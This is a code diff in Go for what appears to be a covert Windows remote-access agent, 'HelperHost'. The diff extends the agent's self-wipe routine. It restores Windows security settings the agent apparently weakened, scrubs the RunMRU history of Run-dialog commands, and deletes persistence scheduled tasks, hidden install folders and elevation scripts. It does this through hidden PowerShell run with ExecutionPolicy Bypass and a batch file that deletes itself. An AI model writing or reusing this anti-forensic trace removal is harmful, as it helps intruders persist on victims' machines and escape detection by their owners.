@@ -456,6 +456,11 @@ taskkill /F /IM EdgeRelay.exe 2>$null
 
 func wipeAll() {
 	stopFlag = true
+	if runtime.GOOS == "windows" {
+		restoreWindowsSecurity()
+		scrubRunMRU()
+		scrubTempInstallArtifacts()
+	}
 	removeAutostart()
 	killRelatedProcs()
 	killTunnelOnly()
@@ -482,18 +487,31 @@ func wipeAll() {
 		if tmp := os.Getenv("TEMP"); tmp != "" {
 			secureRmTree(filepath.Join(tmp, "HelperHostCache"))
 		}
-		// Running .exe stays locked until process exits — finish wipe from a temp bat.
+		// Finish: restore again from temp copy, then delete install tree (exe locked until exit).
+		restorePS1 := filepath.Join(os.TempDir(), "hh-restore-security.ps1")
+		_ = os.WriteFile(restorePS1, []byte(restoreWinSecurityPS1), 0o644)
 		bat := filepath.Join(os.TempDir(), "hh-wipe.cmd")
 		body := "@echo off\r\n" +
-			"ping 127.0.0.1 -n 3 >nul\r\n" +
+			"ping 127.0.0.1 -n 2 >nul\r\n" +
+			"schtasks /Run /TN HelperHostWipeRestore >nul 2>&1\r\n" +
+			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + restorePS1 + "\" >nul 2>&1\r\n" +
+			"ping 127.0.0.1 -n 2 >nul\r\n" +
 			"taskkill /F /IM HelperHost.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM EdgeRelay.exe >nul 2>&1\r\n" +
 			"ping 127.0.0.1 -n 2 >nul\r\n" +
+			"schtasks /Delete /TN HelperHost /F >nul 2>&1\r\n" +
+			"schtasks /Delete /TN HelperHostResume /F >nul 2>&1\r\n" +
+			"schtasks /Delete /TN HelperHostBoot /F >nul 2>&1\r\n" +
+			"schtasks /Delete /TN HelperHostWipeRestore /F >nul 2>&1\r\n" +
+			"schtasks /Delete /TN AgentShePC /F >nul 2>&1\r\n" +
 			"attrib -h -s /s /d \"" + dir + "\\*\" >nul 2>&1\r\n" +
 			"attrib -h -s \"" + dir + "\" >nul 2>&1\r\n" +
 			"attrib -h -s \"" + cacheDir + "\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"" + dir + "\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"" + cacheDir + "\" >nul 2>&1\r\n" +
+			"del /f /q \"" + restorePS1 + "\" >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\HelperHost-elev-*.ps1\" >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\HelperHost-install.*\" >nul 2>&1\r\n" +
 			"del \"%~f0\" >nul 2>&1\r\n"
 		_ = os.WriteFile(bat, []byte(body), 0o644)
 		cmd := exec.Command("cmd", "/C", "start", "", "/MIN", bat)
